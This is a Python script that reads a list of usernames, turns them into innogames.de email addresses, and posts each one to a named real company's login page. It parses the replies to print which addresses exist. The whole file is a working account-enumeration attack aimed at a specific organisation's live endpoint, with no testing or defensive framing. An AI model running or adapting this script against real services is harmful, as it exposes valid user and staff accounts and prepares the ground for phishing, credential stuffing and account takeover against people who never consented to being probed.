import requests, sys, aiohttp, asyncio
from bs4 import BeautifulSoup
from time import sleep

def prepare(usernames, domain):
    return [i.rstrip() + "@" + domain for i in usernames]

def read_and_prepare(file, domain="innogames.com"):
    f = open(file, 'r')
    data = f.readlines()
    f.close()
    return prepare(data, domain)

async def fetch(session, url, email):
    async with session.post(url, data={"email":"%s" % email}) as response:
        return await response.text()

async def main():
    tasks = list()
    url = "https://goodbye.innogames.com/login"
    emails = read_and_prepare("username_list_a", "innogames.de")
    async with aiohttp.ClientSession() as session:
        for email in emails:
            task = asyncio.ensure_future(fetch(session, url, email))
            tasks.append(task) # create list of tasks
            sleep(2)
        responses = await asyncio.gather(*tasks)
        for i in range(len(responses)):
            html = BeautifulSoup(responses[i], 'html.parser')
            if emails[i] == "info@innogames.de":
                print(responses[i])
            found = html.find('p', attrs={"class":"success1 well"})
            if found is not None:
                print("{}\t\tOK".format(emails[i]))
            else:
                print("{}\t\tNO".format(emails[i]))
	 

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
